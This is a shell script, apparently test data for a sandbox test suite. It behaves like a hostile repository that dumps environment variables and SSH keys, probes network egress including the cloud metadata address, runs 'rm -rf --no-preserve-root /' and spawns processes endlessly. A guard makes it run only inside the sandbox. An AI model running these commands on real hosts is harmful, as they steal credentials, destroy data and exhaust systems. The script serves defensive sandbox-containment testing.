#!/bin/sh
# TEST DATA for test/scenes.mjs. Never run this on a host.
#
# A hostile repository: it hunts for secrets, calls hosts off the allowlist, deletes everything it
# can (rm -rf /) and spawns processes without end. test/scenes.mjs copies it into a fresh Mantis Ring
# sandbox, runs one phase at a time there, and checks that the damage stays inside.
# It refuses to run anywhere but such a sandbox: inside Docker, as uid 10001, behind the ring proxy.
#
# Usage, inside a sandbox: sh hostile.sh check | secrets [more paths] | egress | wipe | spawn | all
set -u

if [ ! -f /.dockerenv ] || [ "$(id -u)" != 10001 ] || [ "${HTTPS_PROXY:-}" != http://ring-proxy:8888 ]; then
  echo "hostile.sh: refusing to run, this is not a Mantis Ring sandbox" >&2
  exit 3
fi
cd "$(dirname "$0")" || exit 1

check() {
  echo "inside a Mantis Ring sandbox"
}

# Read every environment it can, then every place a host keeps keys.
secrets() {
  echo "ran secrets"
  names=$(env | cut -d= -f1 | grep -iE 'key|token|secret|passw|credential|auth' | tr '\n' ' ')
  echo "env-suspicious ${names:-none}"
  env
  for f in /proc/[0-9]*/environ; do tr '\0' '\n' < "$f" 2>/dev/null; done
  for p in /etc/mantis-ring/secrets.env /run/secrets /root/.ssh /root/.docker/config.json \
           /home/ring/.ssh /var/run/docker.sock /run/docker.sock "$@"; do
    if [ -S "$p" ]; then echo "found $p (socket)"
    elif [ -d "$p" ] && [ -r "$p" ]; then echo "found $p"; ls -la "$p"
    elif [ -f "$p" ] && [ -r "$p" ]; then echo "found $p"; cat "$p"
    elif [ -e "$p" ]; then echo "denied $p"
    else echo "not-visible $p"; fi
  done
}

# Try to reach the outside: directly, through the proxy, and through DNS.
egress() {
  echo "ran egress"
  node exfil.mjs direct example.org 443
  node exfil.mjs direct 1.1.1.1 443
  node exfil.mjs direct 169.254.169.254 80
  node exfil.mjs dns example.org
  node exfil.mjs proxy example.org 443
  node exfil.mjs proxy-get http://example.org/
  node exfil.mjs proxy 169.254.169.254 80
  node exfil.mjs proxy registry.npmjs.org 443
}

# Delete everything, then count what is left.
wipe() {
  echo "ran wipe"
  echo "rootfs-before $(find / -xdev 2>/dev/null | wc -l)"
  echo "refused $(rm -rf --no-preserve-root / 2>&1 | wc -l)"
  echo "rootfs-after $(find / -xdev 2>/dev/null | wc -l)"
  for d in /work /tmp /home/ring /dev/shm; do
    echo "left $d $(find "$d" -mindepth 1 2>/dev/null | wc -l)"
  done
}

# Start processes until the table is full, and keep trying forever. In Node rather than sh: when a
# fork fails, sh exits at once and bash gives up after about 15 s of retries.
spawn() {
  echo "ran spawn"
  exec node spawn-forever.mjs
}

case "${1:-all}" in
  check) check ;;
  secrets) shift; secrets "$@" ;;
  egress) egress ;;
  wipe) wipe ;;
  spawn) spawn ;;
  all) secrets; egress; wipe; spawn ;;
  *) echo "usage: sh hostile.sh check | secrets [paths] | egress | wipe | spawn | all" >&2; exit 64 ;;
esac
